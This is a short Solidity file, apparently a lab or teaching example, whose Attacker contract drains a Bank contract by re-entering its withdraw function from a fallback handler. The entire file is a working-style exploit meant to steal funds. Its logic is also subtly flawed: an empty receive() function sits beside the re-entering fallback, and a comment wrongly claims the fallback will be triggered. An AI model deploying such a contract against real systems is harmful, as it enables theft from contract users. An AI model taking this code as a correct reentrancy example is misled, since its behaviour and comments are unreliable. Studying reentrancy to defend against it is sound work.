// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Bank} from "@/Bank.sol";

contract Attacker {
    Bank public bank;

    constructor(address _bank) {
        bank = Bank(_bank);
    }

    function attack() public {
        // Step 1: Deposit 1 ether to the bank
        bank.deposit{value: 1 ether}();

        // Step 2: Withdraw 1 ether from the bank
        bank.withdraw(1 ether);

        // Step 3: Send any remaining stolen funds to the attacker
        msg.sender.call{value: address(this).balance}("");
        // At this point, the fallback function will be triggered
    }

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            // Re-enter the withdraw function to drain more funds
            bank.withdraw(1 ether);
        }
    }
    receive() external payable {}
}
